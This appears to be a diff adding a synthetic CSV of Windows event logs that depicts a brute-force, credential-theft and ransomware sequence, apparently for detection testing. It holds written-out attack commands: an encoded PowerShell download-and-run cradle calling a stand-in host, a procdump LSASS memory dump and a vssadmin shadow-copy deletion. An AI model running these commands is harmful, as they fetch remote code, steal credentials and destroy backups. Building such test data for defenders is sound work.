@@ -1,0 +1,10 @@
+TimeCreated,EventID,SourceIp,DestinationIp,ProcessName,CommandLine,Message
+2026-09-22T08:28:14.680230+00:00,4625,185.220.101.5,10.0.0.15,lsass.exe,,"An account failed to log on. Account Name: Administrator. Failure Reason: Unknown user name or bad password."
+2026-09-22T08:28:14.680230+00:00,4625,185.220.101.5,10.0.0.15,lsass.exe,,"An account failed to log on. Account Name: root. Failure Reason: Unknown user name or bad password."
+2026-09-22T08:28:14.680230+00:00,4625,185.220.101.5,10.0.0.15,lsass.exe,,"An account failed to log on. Account Name: svc_sql. Failure Reason: Unknown user name or bad password."
+2026-09-22T08:28:14.680230+00:00,4625,185.220.101.5,10.0.0.15,lsass.exe,,"An account failed to log on. Account Name: backup_admin. Failure Reason: Unknown user name or bad password."
+2026-09-22T08:28:14.680230+00:00,4625,185.220.101.5,10.0.0.15,lsass.exe,,"An account failed to log on. Account Name: admin. Failure Reason: Unknown user name or bad password."
+2026-09-22T08:33:14.680230+00:00,1,10.0.0.15,198.51.100.45,powershell.exe,"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwAxADkAOAAuADUAMQAuADEAMAAwAC4ANAA1AC8AcABheWxvYWQucHMxIikA","Process Creation: PowerShell spawned with encoded payload"
+2026-09-22T08:33:14.680230+00:00,10,10.0.0.15,10.0.0.15,procdump64.exe,"procdump.exe -ma lsass.exe C:\temp\lsass.dmp","Process Access: Memory dump performed on LSASS credential vault"
+2026-09-22T08:38:14.680230+00:00,1,10.0.0.15,10.0.0.15,vssadmin.exe,"vssadmin delete shadows /all /quiet","Process Creation: Volume Shadow Copy deletion attempted by Ransomware"
+2026-09-22T08:38:14.680230+00:00,11,10.0.0.15,194.26.29.112,svchost.exe,"svchost.exe -k netsvcs","File created: C:\Users\Administrator\Desktop\README_FOR_DECRYPT.txt and files changed to .locked"
